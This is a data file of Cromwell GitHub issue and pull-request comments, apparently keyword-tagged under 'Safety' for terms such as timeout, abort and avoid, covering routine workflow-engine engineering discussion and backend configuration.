Safety,"I mentioned this to Jeff earlier, but I had some sort of git calamity that prevents me from squashing down these commits in the usual way. I'll fix this before the actual merge to sprint2 with a brute force patching of a new branch of sprint2 with these changes, but I'd like to hold off on doing that until this is ready for merge to avoid losing your comments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/9#issuecomment-100315647:335,avoid,avoid,335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/9#issuecomment-100315647,1,['avoid'],['avoid']
Safety,"I now notice that both checking for the RC and the 'check-alive' checks are controlled by this setting. This seems a bit strange as the rc checking is comparatively very cheap compared to 'check-alive'. Initially the point of not running check-alive all the time was that the cost was high compared to rc file checking. But now the solution has been to slow down rc checking to the speed of the costly check-alive! I am a bit muddled on this, so am not sure if I am getting it. . Without exit-code-timeout-seconds at what interval is the rc file checked for?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-488542941:498,timeout,timeout-seconds,498,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-488542941,1,['timeout'],['timeout-seconds']
Safety,"I picked up this ticket mostly to avoid getting in other people's way, but having looked at if for a while I'm not seeing much value in this. The default_runtime_attributes feature itself is valuable and working, with Centaur test coverage. The backends aren't really re-implementing default runtime attributes, nearly all the heavy lifting is being done by `RuntimeAttributesDefault`. The backends currently do have to be aware of the existence of the default runtime attributes feature but that doesn't really seem so bad. Unassigning and returning to the bottom of the 0.21 pile, recommending for demotion to a lesser pile or outright closure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-230929279:34,avoid,avoid,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-230929279,1,['avoid'],['avoid']
Safety,I placed the configuration option into backend/abortJobsOnTerminate. If you guys want me to move or rename it to something else I'm happy to.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175077183:47,abort,abortJobsOnTerminate,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175077183,1,['abort'],['abortJobsOnTerminate']
Safety,"I saw intermittent timeouts locally too, that disappeared when re-running the suite. But I think that's part of outside testing issue we're tracking elsewhere. Passing on to @Horneth as next reviewer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155150529:19,timeout,timeouts,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155150529,1,['timeout'],['timeouts']
Safety,"I see, so in order to call cache on an old workflow Cromwell has to dig into the database. . - Effort: **?**; - Risk: **Medium**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-326330274:112,Risk,Risk,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-326330274,1,['Risk'],['Risk']
Safety,"I speculate that this issue is caused by trying to bring in half-aborted previous jobs. Fixing that in Single Workflow mode should alleviate this ticket although the underlying cause (""abort"" leaves cromwell in an inconsistent state) still needs addressing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255117503:65,abort,aborted,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255117503,2,['abort'],"['abort', 'aborted']"
Safety,"I still need to get my [terminology straight](http://martinfowler.com/articles/mocksArentStubs.html), but either a mock or a stub would have probably sufficed. I mainly wanted to feel like the code was ""self-documented"" a little in the tests. Instead, I put in a detector for a `cromwell-account.conf` that when present runs an integration test against the live ""gcr.io"". TODO: I still need to clean up access token caching, but there's lots of other code that may be critiqued.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-161046172:263,detect,detector,263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-161046172,1,['detect'],['detector']
Safety,"I talked to @dshiga about how gs://broad-gotc-dev-storage/dshiga/wgs_split_even_tiledb.hg38.v3.interval_list was created. If you want an interval list for hg38 then that is the best interval list we have created thus far. `v1` is our first crack at creating an interval list that was ""even"" in terms of run times starting with histograms created from the 1000 genomes vcfs (converted from hg19). `v2` is `v1` after taking the 15 longest running shards from the callset we used `v1` on and chopped them into 10 equal parts by bases. `v3` was created once we realized that `v2` nor `v1` covered all of the genome territory that our calling intervals cover so we added the parts of the genome that were missing (they're small so they shouldn't be problem causing). If you wanted to split this interval list without any kind of model helping you make smart splits you will probably run into what we did with gnomad of having to iteratively split the same intervals multiple times to hit acceptable run times which is no fun. . You can always overfit the problem and just make a crazy number of intervals where you can guarantee that even in the worst case for each of those intervals, it will still be under some run time you want to beat but that probably isn't the best strategy for many reasons. Alot of it has to do with the content of the callset which is something we are not good at predicting. The callset we used `v2` on had one interval that was multiple times longer than the next longest shard but in the callset we used `v1` on that same interval was one of the faster ones. Both callsets had around the same number of samples. Currently we are always retroactively ""fixing"" our interval list",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2175#issuecomment-295265998:1386,predict,predicting,1386,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2175#issuecomment-295265998,1,['predict'],['predicting']
Safety,"I talked to the greens a little bit today and I'm thinking the way to go about this is per-function limits. `read_bool()` - 5 chars (""false""); `read_int()` - 19 chars (if I did my sleuthing & counting correct for MAX_INT); `read_float()` - 50 chars (made up, but maxint plus a lot of decimal places); `read_string()` - 128K (because it's 2x what CWL gives you ;) ). Where it gets tricky are the larger objects. I'm less certain on what to do here:. `read_lines()` - I'm thinking this should be the same as `read_string()`; `read_json()` - Same? I think?; `read_[tsv|map|object]()` - No idea but from talking to the greens there are certainly reasonable use cases which would be much larger than the above. It sounded like if we capped this at 1MB it'd easily cover everything they did. From a workbench safety-from-users perspective this seems like the class of functions most likely to be abused as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-266913447:803,safe,safety-from-users,803,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-266913447,1,['safe'],['safety-from-users']
Safety,I think for now it's safe to believe the user that it's an MD5 file,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2621#issuecomment-329262812:21,safe,safe,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2621#issuecomment-329262812,1,['safe'],['safe']
Safety,"I think in general the number of concurrent jobs is determined by both of client side (cromwell) and server side(aws batch). In cormwell, there should be a rate limit of api call (no matter it is job submission or job status query) to avoid DDoS to the server side. On the server side like aws batch, there is also a config for rate limit of concurrent api call, if the number of concurrent api call exceeds the rate limit of server side, the server side may refuse to server so it is important not to set rate limit on the client side/cromwell over the server side rate limit. While on server side, if the concurrent jobs require more resources than the limit such as cpus and mem (compute env in aws batch) , it is the server side responsibility to put the concurrent jobs to queue and make sure they can be launched later when resource is available rather than throwing errors unless the queue is expired (say, resource is still not available one week later). IMHO, aws batch backend should implement the scatter jobs in array jobs which support multiple jobs submission and status query in one single api call, otherwise, it is too easy to exceed the rate limit of aws batch. jobs submission by user --> cromwell (rate limit config) --> aws batch gateway (rate limit config) --> aws batch compute env (resource limit)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395:235,avoid,avoid,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395,1,['avoid'],['avoid']
Safety,"I think it has to, in order to see if the image in the cache hash matches the current pull (or other) request, here is an example: https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/library/pull.go#L55. I’m not super familiar with the code, but looks like the hash is retrieved here https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/oci/pull.go#L36 and then needs to get a manifest https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/build/oci/oci.go#L133 which I’d suspect does just that. https://github.com/containers/image/blob/175bf8b8f9ad897bdc10761e11b466d00f516a63/types/types.go#L238. If a user doesn’t have internet access, or has limited, or there is need to query the registry, might run into trouble. I just tried running an exec to a Docker uri, first of course with Internet to make sure that the images in my cache, and then I disabled my wireless. Without wireless, of course, I couldn’t run anything. This issue could be avoided if the user pulled an image first and then use that image instead of this Docker uri.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995:1087,avoid,avoided,1087,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995,1,['avoid'],['avoided']
Safety,"I think some of the test code is redundant with SwaggerServiceSpec but I don't understand swagger well enough to opine. @kshakir - it looks like you did a lot of the swagger work (albeit a long time ago), any thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2093#issuecomment-289250957:33,redund,redundant,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2093#issuecomment-289250957,1,['redund'],['redundant']
Safety,"I think that this is related with https://github.com/docker/machine/issues/2517, but I believe that cromwell can be more robust to a container still running but detached due to timeout.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371154240:177,timeout,timeout,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371154240,1,['timeout'],['timeout']
Safety,I think the other one is redundant,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/437#issuecomment-185444571:25,redund,redundant,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/437#issuecomment-185444571,1,['redund'],['redundant']
Safety,"I think we might be having a similar issue:; ```; Bad output 'pindel.deletions': Futures timed out after [60 seconds]; Bad output 'pindel.insertions': Futures timed out after [60 seconds]; Bad output 'pindel.long_insertions': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. If we don't want to change our caching strategy, can we simply increase the timeout? Can that be done with `akka.http.server.request-timeout`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-444687019:1731,timeout,timeout,1731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-444687019,4,['timeout'],['timeout']
Safety,"I thought we were going to try @aednichols's idea for autocommitting the heartbeat writes (still batched, just not wrapped in one big transaction) to avoid having to do this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4240#issuecomment-429881369:150,avoid,avoid,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4240#issuecomment-429881369,1,['avoid'],['avoid']
Safety,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:207,timeout,timeout-seconds,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048,1,['timeout'],['timeout-seconds']
Safety,"I used a custom config file:. ```; akka {; loggers = [""akka.event.slf4j.Slf4jLogger""]; logging-filter = ""akka.event.slf4j.Slf4jLoggingFilter""; }. spray.can {; server {; request-timeout = 40s; }; client {; request-timeout = 40s; connecting-timeout = 40s; }; }. backend {; providers {; Local {; config {; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash ${docker_cwd}/execution/script""; }; }; }; }; ```. I'm happy to submit a PR to `core/src/main/resources/reference.conf` if that's helpful, but it would basically just replace the `submit-docker` line with the one above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1556#issuecomment-253004034:177,timeout,timeout,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1556#issuecomment-253004034,3,['timeout'],['timeout']
Safety,"I want to comment on the fact that there are hidden dangers in using the function `Float size(Array[File])` as shown in a Terra community forum [post](https://support.terra.bio/hc/en-us/community/posts/360071583412-PreparingJob-state-consumes-most-of-a-task-running-time-how-to-avoid-). For large arrays, this can cause tasks to take forever to start in Google Cloud. Although this is not a WDL specification issue, developers need somehow to be made aware of this, especially in cases where the array contains files that are known in advance to have similar sizes, in which case the following code:; ```; input {; Array[File]+ files; }; Float arr_size = size(files, ""GiB""); ```; Could be replaced by:; ```; input {; Array[File]+ files; }; Float arr_size = length(files) * size(files[0], ""GiB""); ```; And be significantly more efficient.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3183#issuecomment-662042665:278,avoid,avoid,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3183#issuecomment-662042665,1,['avoid'],['avoid']
Safety,"I wanted to follow-up on this error: I am now seeing this error after implementing the standard broad institute alignment pipeline on the HPC at my institute: https://portal.firecloud.org/?return=terra#methods/five-dollar-genome-analysis-pipeline-gilad/five-dollar-genome-analysis-pipeline-gilad/1. Specifically my error is: . [INFO] [08/12/2024 19:26:46.031] [cromwell-system-akka.dispatchers.engine-dispatcher-29] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor: Workflow 8b8c576b-50bc-4a33-b326-0f69be43ece9 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'CreateSequenceGroupingTSV.sequence_grouping': Failed to read_tsv(""sequence_grouping.txt"") (reason 1 of 1): Future timed out after [60 seconds]; Bad output 'CreateSequenceGroupingTSV.sequence_grouping_with_unmapped': Failed to read_tsv(""sequence_grouping_with_unmapped.txt"") (reason 1 of 1): Future timed out after [60 seconds]. Bad output 'GetBwaVersion.bwa_version': Failed to read_string(""/scratch/tpa239/Step123/TN_2036/TN2036_phylogenetics_8_10_testing/slurm/alignment/alignment_TN2036_sample106/cromwell-executions/WholeGenomeGermlineSingleSample/8b8c576b-50bc-4a33-b326-0f69be43ece9/call-UnmappedBamToAlignedBam/UnmappedBamToAlignedBam/207b9946-03a6-4969-bdab-318482635923/call-GetBwaVersion/execution/stdout"") (reason 1 of 1): Future timed out after [60 seconds]. I think it has to do with this read_tsv and function - sometimes an identical job will have this error and sometimes they don't, I think it has to do with how busy the cluster is. . Is there some setting I can change to increase this timeout? Should I increase the number of cpus or memory for these jobs failing?. I am using cromwell version 85. Thank you!. Toby",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2291515502:1714,timeout,timeout,1714,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2291515502,1,['timeout'],['timeout']
Safety,I'd suggest to avoid overlapping `database interaction` arrows with arrows of other types on the diagram. Something like this:; ![image](https://user-images.githubusercontent.com/4853242/68885542-5d3f6500-06e3-11ea-992e-ed9b6d0f3578.png). Looks like something happened with the error between `ServiceRegistryActor` and `HybridMetadataServiceActor`:; ![image](https://user-images.githubusercontent.com/4853242/68885905-0c7c3c00-06e4-11ea-9840-ddb24591df85.png),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5264#issuecomment-554023387:15,avoid,avoid,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5264#issuecomment-554023387,1,['avoid'],['avoid']
Safety,I'll close this then and re-open if a file read timeout is reported again. Thanks Adam + Thibault,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-418714485:48,timeout,timeout,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-418714485,1,['timeout'],['timeout']
Safety,I'm (slowly) spinning up a cloud sql instance to sanity check that my branch can handle a gotc db migration in a single transaction.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1447#issuecomment-248127965:49,sanity check,sanity check,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1447#issuecomment-248127965,1,['sanity check'],['sanity check']
Safety,"I'm going to add these notes to the [Spec Doc](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit) and close this issue. Aborts need some serious thought and work, to be tracked in the spec doc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1414#issuecomment-324470022:155,Abort,Aborts,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1414#issuecomment-324470022,1,['Abort'],['Aborts']
Safety,"I'm guessing that the ""people aren't around"" thing isn't going to change at 5pm on a Friday, so .... I'm thinking now that instead, perhaps the thing to do is to also have the actor know if read is on and if write is on. When the actor spins up, it ...; - If read is on, just starts determining the cache hit status w/o being asked; - If write is on, starts hashing everything; - If both are on, starts hashing everything but is checking for cache hit until a miss occurs, at which point it's just generating hashes. The actor could then receive two messages, one is ""are you a cache hit"" and the other is ""please now persist to the store"" (if you asked for cache hit status before it was done, perhaps it could send back a ""come back later"" message - that way you can avoid returning the Futures, although perhaps people like that). We know for a fact that if read is on that we'll be checking the cache, so might as well start that ASAP. If write is on, we're potentially wasting energy - e.g. if a job fails, but presumably (hopefully!) job successes are more common than job failures and we can get a jumpstart on the process.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880:769,avoid,avoid,769,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880,1,['avoid'],['avoid']
Safety,"I'm late to the party on this, but:. > Then chains of tasks could effectively become one task. I don't think merging of tasks works if you have certain resource or software dependencies, eg: inside a docker container. From a software engineering POV, is it easy / possible to detect and facilitate streaming between tasks like this, especially if they're scheduled as completely separate jobs? To me it sounds super difficult, like you'd have like a ""fuzzy"" dependency graph, and you could end up streaming your result data between nodes or tasks (and even worse if you're running on the cloud). (@mr-c, you've talked about this a [few times](https://github.com/common-workflow-language/cwltool/issues/644#issuecomment-366719563)). > parallel, rather than sequentially. Mostly, but what happens if two of the inputs are technically streamable, or even more complicated how would `stdin` fit into this. The [CWL documentation](https://www.commonwl.org/v1.0/CommandLineTool.html#CommandLineTool) says that it requires the path (eg: [`$(inputs.stdinRef.path)`](; https://www.biostars.org/p/258614/#290536)) which to me sounds like it isn't exactly streamable, but `stdout` [implicitly is?](https://www.commonwl.org/v1.0/CommandLineTool.html#stdout) WDL in the version [1.0 spec](https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#language-specification) doesn't include any reference to 'stream', so I'm surprised to see the DNAnexus adding a separate tagging mechanism for this optimisation. _Late edit: reformatting for clarity_; Engine support:. - Cromwell (not supported) [[source](https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-455542734)]; - CWLTool (not supported) [[source](https://github.com/common-workflow-language/cwltool/issues/644)]; - Toil (not supported) [[source](https://github.com/common-workflow-language/cwltool/issues/644#issuecomment-366719563)]. But piping (named and anonymous) is super easy in WDL because you have a command line, and in CWL yo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-455367417:276,detect,detect,276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-455367417,1,['detect'],['detect']
Safety,"I'm not 100% convinced that scaling is completely wired. Have you confirmed that this increase is also affecting your test timeouts? The linked error from #4223 says:. > Attempted 13 times over 5.126574189 seconds. That's *way* too short for something that should have already been scaled 12x. I'm in the process of [adding some println-debugging](https://github.com/broadinstitute/cromwell/commit/29d2f35662d6a81a4de383ad54df4ee0242611a4) on a similar issue. In my case I suspect one of the many, many timeouts wasn't scaled for an akka `.ask`, but will have to wait until the docker network issues are resolved to find out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430412625:123,timeout,timeouts,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430412625,2,['timeout'],['timeouts']
Safety,"I'm really just trying to avoid ""Cromwell will regress and no longer succeed a workflow that Rawls thinks is fine"". I think the process is reasonable as long as there are some safeguards against this, and if you tell me that the current test approach covers that, fine with me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-489691429:26,avoid,avoid,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4941#issuecomment-489691429,2,"['avoid', 'safe']","['avoid', 'safeguards']"
Safety,"I'm running into the same problem here, also on SGE, for a task with 256 shards each with multiple outputs. Looks like about a dozen of the shards failed with the same timeout, and Cromwell attempted retries for half of them without success. @malachig The akka setting only controls the REST API. The timeout we're seeing appears to be hardcoded in Scala.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-495935624:168,timeout,timeout,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-495935624,2,['timeout'],['timeout']
Safety,"I'm still not 100% sure I'm happy with this - ideally we could tell if the timeout was ""a previous copy attempt"" or ""the current copy attempt"", rather than basing this on ""was it a timeout exception...?""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4085#issuecomment-420352896:75,timeout,timeout,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4085#issuecomment-420352896,2,['timeout'],['timeout']
Safety,"I've been working on this issue in parallel. My general recommendation would be to **not use GCR for _public_ images** as there is a perpetual risk of egress charges to the image owner. GCR is great for keeping more of your workflow infrastructure inside Google Cloud, but egress charges will be billed to you as the owner of the storage bucket. [Artifact registry seems to have its own set of egress charges](https://cloud.google.com/artifact-registry/pricing), similar to GCS egress charges. Alternatively, services like [quay.io](https://quay.io/plans/) offer unlimited storage and serving of public repos. The consequence of not using GCR is that docker images are now hosted outside of Google Cloud, meaning workflows will need to make an external network call to download the image. The external call will require VMs to have an external IP address. Large parallel workflows will need quota for several external IP addresses, and may run into quota limits. . To alleviate this, workflow runners could be instructed to make a copy of the image into their own GCR. This also has the advantage that the workflow runner can use a repository in the same location as their VMs. Workflow publishers should include instructions on how to upload the image to a private GCR. . How does that sound as a set of guidelines for the community?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238:143,risk,risk,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-902091238,2,['risk'],['risk']
Safety,"I've downloaded the new jar file, still showing version 30.2, but still seeing the problem in some situations:. 2018-02-21 11:03:39,563 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - Abort requested for workflow f0bff6e2-77a6-46f5-b226-13a64339a286.; 2018-02-21 11:03:39,564 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - WorkflowExecutionActor-f0bff6e2-77a6-46f5-b226-13a64339a286 [UUID(f0bff6e2)]: Aborting workflow; 2018-02-21 11:03:39,567 cromwell-system-akka.dispatchers.engine-dispatcher-50 WARN - unhandled event EngineLifecycleActorAbortCommand in state SubWorkflowRunningState. Several SGE queue jobs continue to run/stay in the queue waiting state. Terminating the server with a ctrl-C does not affect the queued jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3259#issuecomment-367435337:197,Abort,Abort,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3259#issuecomment-367435337,2,['Abort'],"['Abort', 'Aborting']"
Safety,"I've found at least three kinds of brokenness here:; 1. Cromwell never sends a `WorkflowManagerAbortSuccess` from the `WorkflowManagerActor` to the API handler, so the response to the abort POST is never completed on a successful abort.; 2. If the `WorkflowManagerActor` is asked to abort a workflow ID it doesn't recognize it throws a `WorkflowNotFoundException` which eventually completes the abort request with a 404. Unfortunately the decoupling between the `WorkflowStore` and the `WorkflowManagerActor` introduces a gaping race condition where a legitimate workflow ID may not be known to the `WorkflowManagerActor` for a long time after that ID has been returned to the submitter.; 3. There's a third failure mode where the abort request seems to be ignored with various error and warning messages and jobs just keep running:. ```; 2016-09-09 15:50:44,628 cromwell-system-akka.actor.default-dispatcher-7 INFO - Workflow aed1aad8-588d-4f84-aa09-da0f663d68c0 submitted.; 2016-09-09 15:50:56,111 cromwell-system-akka.actor.default-dispatcher-15 INFO - 1 new workflows fetched; 2016-09-09 15:50:56,112 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowManagerActor Starting workflow UUID(aed1aad8-588d-4f84-aa09-da0f663d68c0); 2016-09-09 15:50:56,116 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowManagerActor Successfully started WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0; 2016-09-09 15:50:56,116 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2016-09-09 15:50:56,175 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: transitioning from WorkflowUnstartedState to MaterializingWorkflowDescriptorState; 2016-09-09 15:50:56,261 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - MaterializeWorkflowDescriptorActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: Call-to-Backend assignmen",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:184,abort,abort,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,5,['abort'],['abort']
Safety,"I've seen this again on Cromwell 25-f80282a, after I aborted a workflow. Rebooting does NOT seem to have cleared it up this time. The workflow bucket doesn't exist. As far as I can tell, there is no mention of the workflow in Cromwell logs (weirdly).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-289962509:53,abort,aborted,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-289962509,2,['abort'],['aborted']
